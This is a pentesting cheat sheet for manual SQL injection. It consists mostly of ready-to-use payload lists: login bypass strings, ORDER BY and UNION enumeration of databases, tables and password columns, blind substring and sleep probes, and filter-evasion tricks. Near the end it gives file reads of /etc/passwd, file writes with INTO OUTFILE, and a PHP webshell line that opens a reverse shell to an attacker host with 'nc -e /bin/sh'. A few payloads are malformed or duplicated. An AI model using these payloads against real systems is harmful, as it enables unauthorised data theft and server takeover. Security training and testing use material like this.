---
title: SQLi Cheat sheet for manual injection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
---

# SQLi Cheat sheet for manual injection

See a more detailed [explanation about SQL injection](webexploitation/sql-injection).


### Boolean-based testing

#### Integer based parameter injection

Common in Integer based parameter injection such as:

```
URL: https://site.com/user.php?id=1
SQL query: SELECT * FROM users WHERE id= FUZZ;
```

Typical payloads for that query:

```
# Return true
AND 1
And true

# Return False
AND 0
And false

# Return 56 if vulnerable
1*56

# Return 1 if not vulnerable
1*56

```


#### String based parameter injection

```
URL: https://site.com/user.php?id=alexis
SQL query: SELECT * FROM users WHERE name= 'FUZZ';
```

Typical payloads for that query:

```
# Return true
''
""

# Return false
'
"
```


**Exploiting single quote (')**: In SQL, the single quote is used to delimit string literals. A way to exploit this is in a Login form:

```
# SQL query
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'

# Payload
' OR '1'='1'; --

# The attacker's injected SQL code ' OR '1'='1'; -- causes the condition '1'='1' to evaluate to true, effectively bypassing the
authentication mechanism. Modified query would became
SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '<password>'
```


### Error-based testing

Firstable, every DBMS/RDBMS responds to incorrect/erroneous SQL queries with different error messages, so an error response can be use to fingerprint the database:

A typical error from MS-SQL will look like this:

```
Incorrect syntax near [query snippet]
```


While a typical MySQL error looks more like this:

```
You have an error in your SQL syntax. Check the manual that corresponds
to your MySQL server version for the right syntax to use near [query
snippet]
```


```

 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
```




### Manual UNION attack


```
# 0. Comments 
--comment       // Oracle
--comment       // Microsoft
/*comment*      // Microsoft
--comment       // PostgreSQL
/*comment*/     // PostgreSQL
#comment        // MySQL
-- comment      // MySQL [Note the space after the double dash]
/*comment*/     // MySQL

# Access (using null characters)
' OR '1'='1' %00
' OR '1'='1' %16


   
# 1. Bypass a form      
1' OR '1'='1';#
' OR '1'='1';#
1' OR '1'='1';-- - 
' OR '1'='1';-- -  


# 2. Number of columns (UNION attack)
1' OR '1'='1' order by 1;#
1' OR '1'='1' order by 2;#
1' OR '1'='1' order by 3;#
...
# Do this until you get an error message and then you will know the number of columns
# Another method to see the number of columns. 
' OR '1'='1' order by 1;-- -   

# 3. Get which column is being displayed. For instance, when we know we have 6 columns:
1' OR '1'='1' UNION SELECT all 1,2,3,4,5,6;# 

# 4. Get names of all databases 
1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#

# 5. Get names of all tables from the selected database
1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 


# 6. Get the name of all columns of a selected table from a selected database
1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users';#


# 7. Get the value of a selected column (for instance, password)
1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#

1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM <databaseName.tableName>;#


```

Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:

```
database()
user()
version()
```


Also, interesting payloads for retrieving concatenates values in a UNION based attack:

```
## Extract database names, table names and column names

#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

And here an example of how to retrieve them:

```
# if injectable columns are number 2, 3 and 4 you can display some info from the system
union select 1, database(),user(),version(),5

# Extra bonus
# You can also load a file from the system with
union select 1, load_file(/etc/passwd),3,4,5

# and you can try to write to a file in the server
union select 1,'example example',3,4,5 into outfile '/var/www/path/to/file.txt'
union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'

# and we can combine that with a reverse shell like
union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'

```


### Manual SQLi Blind attack

user() returns the name of the user currently using the database.
substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

```
' OR substring(user(), 1, 1) = 'a
' OR substring(user(), 1, 1) = 'b
1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
```


### Extra Bonus: Bypassing quotation marks

Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.

More bypassing tips:

```
# Using mingled upper and lowercase

# Using spaces url encoded
+

# Using comments
/**/
/**
--
; --
; /*
; //

# Example of bypassing webpages that only displays one value at a time
1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&Submit=Submit#

```
